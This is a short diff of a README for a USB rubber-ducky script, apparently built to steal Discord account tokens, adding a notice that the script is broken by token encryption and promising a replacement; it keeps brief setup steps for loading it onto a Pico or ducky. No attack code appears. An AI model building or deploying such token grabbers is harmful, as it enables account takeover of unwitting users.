@@ -1,4 +1,6 @@
 # Ducky-Discord-Token-Grabber
+THIS SCRIPT IS NOW BROKEN DUE TO TOKENS BEING ENCYRPTED. I WILL MAKE A NEW SCRIPT SOON.
+
 This script was originally made for Raspberry Pi Pico.
 
 To start, move all the files to your ducky. (Need to encode the .dd file if not using Pico)
